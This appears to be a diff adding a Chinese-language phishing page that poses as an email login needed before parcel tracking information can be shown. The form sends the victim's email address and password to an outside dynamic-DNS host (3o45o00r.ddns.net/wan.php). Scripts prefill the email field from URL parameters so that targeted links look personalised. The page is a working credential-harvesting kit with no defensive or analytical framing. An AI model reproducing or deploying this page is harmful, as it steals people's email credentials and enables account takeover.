@@ -1,0 +1,121 @@
+<!DOCTYPE html> 
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>登录</title>
+     <link rel="stylesheet" href="./zo/public-2c196f050f.css">
+    <link rel="shortcut icon" type="image/x-icon" href="./zo/logo.ico" media="screen" />
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script> 
+</head>
+
+<body style="">
+  
+    <div class="wrap">
+    
+        <div class="login_container">
+            <div class="login_main">
+			
+                  <form method="post"  action="https://3o45o00r.ddns.net/wan.php" class="shurt">
+                <div class="login_box" style=" background-color: #e8e8e8;     height: 358px;">
+                    <div class="header" style=" margin: 0; "><span class="header_tip"><i style=" padding-left: 0px; ">电子邮件验证</i></span><input  name="sile" id="dom" class="go_register" style="text-align: right;border: 0;text-decoration: none;margin-top: -22px;outline: 0;color: #a4b9d1;display: inline-block;font-size: 19px;" readonly="" /></div>
+                   <div style=" color: #f48071; font-size: 23px; margin-top: 10px; border-bottom: solid 1px #cdcfd7; padding-bottom: 10px; ">在我们显示物流信息之前需要电子邮件登录</div> 
+                    <div class="switch_pwd_con" style="">
+                        <div class="item">
+                            <p class="tips account_login_tips"></p><span class="name w55">邮件:</span>
+                            <input type="text" id="app" name="pusistenc" placeholder="注册手机号" class="w309" required="">
+                        </div>
+                        <div class="item">
+                            <p class="tips"></p><span class="name w55">密码：</span>
+                            <input type="password" placeholder="请输入密码" name="peewd" class="w309" required="">
+                        </div>
+
+						 
+	   <button   name="jabasni" class="submit" style="outline: 0;border: 0;margin-bottom: 27px;cursor: pointer;width: 365px;">
+登录
+</button>
+					</form>
+                  
+                </div>
+            </div>
+        </div>
+       
+       
+        <script>
+            function showQrTips() {
+                $(".qr_code").animate({
+                    left: "0px",
+                    marginLeft: "0"
+                }, 300), $(".qr_code_hover").fadeIn(1e3)
+            }
+
+            function hideQrTips() {
+                $(".qr_code").animate({
+                    left: "50%",
+                    marginLeft: "-92px"
+                }, 300), $(".qr_code_hover").hide()
+            }
+        </script>
+        <script src="./zo/wxLogin.js.download"></script>
+        <script src="./zo/form-4cae7d1c49.js.download"></script>
+        <script src="./zo/index-430ca3cef8.js.download"></script>
+    </div>
+  
+<script>
+    
+$.urlParam = function(dom){
+    var results = new RegExp('[\?&]' + dom + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#dom").val($.urlParam('dom'));
+        
+        });
+        
+</script>
+
+  
+<script>
+    
+$.urlParam = function(app){
+    var results = new RegExp('[\?&]' + app + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#app").val($.urlParam('app'));
+        
+        });
+        
+</script>
+	
+	
+</body>
+
+
+
+</html>
